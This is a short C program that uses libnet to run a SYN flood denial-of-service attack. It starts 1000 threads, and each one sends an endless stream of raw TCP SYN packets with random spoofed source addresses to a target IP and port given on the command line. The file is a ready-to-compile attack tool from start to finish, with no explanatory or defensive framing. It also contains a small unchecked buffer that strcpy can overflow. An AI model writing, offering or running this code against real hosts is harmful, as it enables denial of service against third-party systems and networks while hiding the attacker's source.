#include <libnet.h>
#include <pthread.h>
#include <string.h>


pthread_t thread_id[1000];
char dest_ip_o[20];
char dest_port_o[5];

void *DOS(void *data);
int main(int argc, char *argv[])
{
  strcpy(dest_ip_o,argv[1]);   
  strcpy(dest_port_o,argv[2]);  

    for(int i=0;i<1000;i++){
    pthread_create(&thread_id[i],NULL,DOS,NULL);
    }  
    pthread_join(thread_id[1],NULL);
    return 0;
    
}


void *DOS(void *data)
{
     libnet_t *lt;
    uint32_t dest_ip_addr, s_ip_addr;
    uint16_t dest_port, s_port;
    u_char errbuf[LIBNET_ERRBUF_SIZE];
    libnet_ptag_t ip_tag, tcp_tag;
    int bytes;
    ip_tag = tcp_tag = 0;
    lt = libnet_init(LIBNET_RAW4, "em0", errbuf);
    dest_ip_addr = libnet_name2addr4(lt, dest_ip_o, LIBNET_DONT_RESOLVE);
    dest_port = (uint16_t)atoi(dest_port_o);
    printf("dest adres : %s  dest port : %d \n", libnet_addr2name4(dest_ip_addr, LIBNET_DONT_RESOLVE), dest_port);
    libnet_seed_prand(lt);

    while (1)
    {
        s_ip_addr = libnet_get_prand(LIBNET_PRu32);
        s_port = libnet_get_prand(LIBNET_PRu16);

        /*--------------------tcp------------------------------------*/
        tcp_tag = libnet_build_tcp(s_port,
                                   dest_port,
                                   libnet_get_prand(LIBNET_PRu32),
                                   libnet_get_prand(LIBNET_PRu32),
                                   TH_SYN,
                                   libnet_get_prand(LIBNET_PRu16),
                                   0,
                                   0,
                                   LIBNET_TCP_H,
                                   NULL,
                                   0,
                                   lt,
                                   tcp_tag);
        /*--------------------ip------------------------------------*/
        ip_tag = libnet_build_ipv4(LIBNET_TCP_H + LIBNET_IPV4_H,
                                   0,
                                   libnet_get_prand(LIBNET_PRu16),
                                   0,
                                   libnet_get_prand(LIBNET_PR8),
                                   IPPROTO_TCP,
                                   0,
                                   s_ip_addr,
                                   dest_ip_addr,
                                   NULL,
                                   0,
                                   lt,
                                   ip_tag);
        bytes = libnet_write(lt);

    }

    libnet_destroy(lt);
    return NULL;
  
}
